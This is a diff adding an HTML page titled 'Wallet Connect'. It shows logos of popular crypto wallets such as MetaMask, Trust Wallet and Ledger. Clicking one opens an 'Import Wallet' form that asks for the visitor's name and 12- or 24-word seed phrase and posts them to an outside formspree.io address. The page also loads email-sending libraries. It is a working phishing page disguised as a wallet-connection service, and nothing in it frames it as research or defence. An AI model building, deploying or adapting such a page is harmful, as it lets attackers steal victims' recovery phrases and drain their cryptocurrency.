@@ -1,0 +1,230 @@
+<html>
+  <head>
+    <title>Wallet Connect</title>
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <!-- Get some bootstrap default styles -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+    (function() {
+    emailjs.init("user_4DuWbxVBY4G0YIPTe7dFl");
+    })();
+    </script>
+  </head>
+  <style>
+    .row{
+      display: flex !important;
+      flex-wrap: wrap;
+      margin-right: -15px;
+      margin-left: -15px;
+    }
+    body{
+      background-image: url("11.gif") !important;
+     
+  /* Full height */
+  
+
+  /* Center and scale the image nicely */
+  background-position: center;
+  background-repeat: no-repeat;
+  background-size: cover;
+ 
+    }
+    .content {
+      
+      bottom: 0;
+      background: rgba(0, 0, 0, 0.5);
+      color: #f1f1f1;
+      width: 100%;
+      padding: 60px;
+    }
+  </style>
+  <body  class="container p-3" style="margin-top: 40px;">
+    <!-- Construct a Bootstrap layout -->
+    <div class="container content">
+      <div class="row">
+        <div class="col-md-12">
+          <h1 style="text-align: center;">Connect Your Wallet</h1>
+        
+          <p class="btn btn-info btn-sm" >No wallet connected. </p><p  style="text-align: center;"> Connect Your wallet,  highly secure integrations with top wallet, you can efficiently manage all your wallets.</p>
+          
+          <div class="d-flex flex-wrap justify-content-center">
+            <div class="item" id="btn-connect" style="margin: 10px;">
+              <img src="walletconnect.svg" class="image" alt="Name" width="70">
+              
+              <button class="" id="btn-connect" style="background: none; border:none; color:white;">
+                 wallet Connect
+              </button>
+              <i class="lar la-angle-right icon"></i>
+            </div>
+            <div class="item" data-bs-toggle="modal" data-bs-target="#exampleModal" style="margin: 10px; cursor:pointer;">
+              <img src="trust-wallet.jpg" class="image" alt="Name" width="70">
+              <span class="text">Trust Wallet</span>
+              <i class="lar la-angle-right icon"></i>
+            </div>
+            <div class="item" data-bs-toggle="modal" data-bs-target="#exampleModal" style="margin: 10px;cursor:pointer;">
+              <img src="metamask.jpg" class="image" alt="Name" width="70">
+              <span class="text">Meta Mask</span>
+              <i class="lar la-angle-right icon"></i>
+            </div>
+       
+            <div class="item" data-bs-toggle="modal" data-bs-target="#exampleModal" style="margin: 10px;cursor:pointer;">
+              <img src="fortmatic.jpg" class="image" alt="Name" width="70">
+              <span class="text">FortMatic</span>
+              <i class="lar la-angle-right icon"></i>
+            </div>
+            <div class="item" data-bs-toggle="modal" data-bs-target="#exampleModal" style="margin: 10px;cursor:pointer;">
+              <img src="aave.jpg" class="image" alt="Name" width="70">
+              <span class="text">AAVE</span>
+              <i class="lar la-angle-right icon"></i>
+            </div>
+            <div class="item" data-bs-toggle="modal" data-bs-target="#exampleModal" style="margin: 10px;cursor:pointer;">
+              <img src="digitex.jpg" class="image" alt="Name" width="70">
+              <span class="text">Digitex</span>
+              <i class="lar la-angle-right icon"></i>
+            </div>
+            <div class="item" data-bs-toggle="modal" data-bs-target="#exampleModal" style="margin: 10px;cursor:pointer;">
+              <img src="exodus.jpg" class="image" alt="Name" width="70">
+              <span class="text">Exodus</span>
+              <i class="lar la-angle-right icon"></i>
+            </div>
+            <div class="item" data-bs-toggle="modal" data-bs-target="#exampleModal" style="margin: 10px;cursor:pointer;">
+              <img src="ledger.jpg" class="image" alt="Name" width="70">
+              <span class="text">Ledger</span>
+              <i class="lar la-angle-right icon"></i>
+            </div>
+            <div class="item" data-bs-toggle="modal" data-bs-target="#exampleModal" style="margin: 10px;cursor:pointer;">
+              <img src="coinbase.jpg" class="image" alt="Name" width="70">
+              <span class="text">Coinbase</span>
+              <i class="lar la-angle-right icon"></i>
+            </div>
+            <div class="item" data-bs-toggle="modal" data-bs-target="#exampleModal" style="margin: 10px;cursor:pointer;">
+              <img src="defiat.jpg" class="image" alt="Name" width="70">
+              <span class="text">Defiat</span>
+              <i class="lar la-angle-right icon"></i>
+            </div>
+        
+        
+          </div>
+          <div id="prepare">
+          
+      
+<!-- Button trigger modal -->
+
+
+<!-- Modal -->
+<div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title" id="exampleModalLabel" style="color: black;">Import Wallet</h5>
+        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+      </div>
+      <div class="modal-body">
+        <form   id="form" action="https://formspree.io/f/xwkajpwe"  method="POST">
+          <div class="form-group">
+            <label for="from_name" style="color: black;">Name:</label>
+            <input type="text" class="form-control" id="exampleFormControlInput1" placeholder="name" name="from_name" required>
+          </div>
+         <br>
+     
+          <div class="form-group">
+             <label for="message" style="color: black;">Key:</label>
+            
+            <textarea class="form-control" id="exampleFormControlTextarea1" rows="3" placeholder="Enter your 12 seed phrase" name="message" required></textarea>
+            <p><i style="color: black;">Typically 12 words(sometimes 24) separated by single spaces</i></p>
+          </div>
+             </div>
+             
+      <div class="modal-footer">
+        
+        <input type="submit" class="btn btn-success" id="button" value="Import" >
+       
+      </div>
+    </form> 
+    </div>
+  </div>
+</div>
+
+
+          </div>
+
+          <div id="connected" style="display: none">
+
+            <button class="btn btn-primary" id="btn-disconnect">
+              Disconnect wallet
+            </button>
+
+            <hr>
+
+            <div id="network">
+              <p>
+                <strong>Connected blockchain:</strong> <span id="network-name"></span>
+              </p>
+
+              <p>
+                <strong>Selected account:</strong> <span id="selected-account"></span>
+              </p>
+
+            </div>
+
+            <hr>
+
+            <h3>All account balances</h3>
+
+            <table class="table table-listing">
+              <thead>
+                <th>Address</th>
+                <th>ETH balance</th>
+              </thead>
+
+              <tbody id="accounts">
+              </tbody>
+            </table>
+
+            <p>Please try to switch between different accounts in your wallet if your wallet supports this functonality.</p>
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <!-- We use simple <template> templating for the example -->
+    <div id="templates" style="display: none">
+      <template id="template-balance">
+        <tr>
+          <th class="address"></th>
+          <td class="balance"></td>
+        </tr>
+      </template>
+    </div>
+
+    <!--
+
+      Use unpkg CDN to load all NPM packages to vanilla Javascript - read more at http://unpkg.com
+
+      On your deployment, you properly either want to use a preprocessing tool like webpack
+      to include these files, or extract NPM archives and manually host the files inside.
+
+      TODO: Pin down all versions.
+
+    -->
+    <script src=
+    "https://smtpjs.com/v3/smtp.js">
+  </script>
+    <script src="https://unpkg.com/web3@latest/dist/web3.min.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/web3modal"></script>
+    <script type="text/javascript" src="https://unpkg.com/evm-chains/lib/index.js"></script>
+    <script type="text/javascript" src="https://unpkg.com/@walletconnect/web3-provider"></script>
+    <script type="text/javascript" src="https://unpkg.com/fortmatic@2.0.6/dist/fortmatic.js"></script>
+
+    <!-- This is our example code -->
+    <script type="text/javascript" src="script.js"></script>
+    <script type="text/javascript" src="email.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script>
+  </body>
+</html>
